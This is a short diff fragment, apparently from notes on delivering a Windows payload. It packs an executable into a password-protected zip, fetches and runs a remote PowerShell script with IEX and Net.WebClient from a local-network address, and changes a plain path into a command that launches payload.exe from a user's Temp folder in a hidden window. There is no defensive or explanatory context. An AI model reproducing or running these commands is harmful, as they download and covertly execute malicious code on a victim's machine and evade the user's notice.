@@ -17,5 +17,5 @@ zip --password SuaSenhaForte payload_protegido.zip payload_encoded.exe
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.128:8080/payload.ps1')
 
 
-C:\Users\rsilva\AppData\Local\Temp\payload.exe
+powershell.exe -WindowStyle hidden -Command "Start-Process 'C:\Users\rsilva\AppData\Local\Temp\payload.exe'"
 
